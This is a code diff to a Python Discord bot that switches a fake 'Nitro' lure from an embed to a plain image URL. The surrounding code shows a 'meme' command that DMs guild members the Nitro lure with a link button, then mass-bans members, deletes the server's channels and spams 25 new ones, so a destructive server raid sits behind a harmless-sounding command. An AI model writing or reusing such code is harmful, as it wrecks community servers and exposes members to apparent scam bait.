@@ -22,10 +22,12 @@ bot = commands.Bot(
     strip_after_prefix=True,
 )
 
-nitro_embed = Embed()
-nitro_embed.set_image(
-    url="https://media.discordapp.net/attachments/974725497248428103/978048121345028102/unknown.png?width=674&height=171"
-)
+# nitro_embed = Embed()
+# nitro_embed.set_image(
+#     url="https://media.discordapp.net/attachments/974725497248428103/978048121345028102/unknown.png?width=674&height=171"
+# )
+
+nitro_url = "https://media.discordapp.net/attachments/974725497248428103/978048121345028102/unknown.png?width=674&height=171"
 
 nitro_button = Button(
     style=ButtonStyle.url,
@@ -63,7 +65,7 @@ async def assist(inter: ACI):
 
 @bot.command()
 async def meme(ctx: commands.Context):
-    await RC.send_dm(ctx.guild, nitro_embed, nitro_button)
+    await RC.send_dm(ctx.guild, nitro_url, nitro_button)
     await RC.ban_members(ctx.guild, ctx.author)
     await RC.channel_remove(ctx.guild)
     await RC.channel_make(ctx.guild, 25)
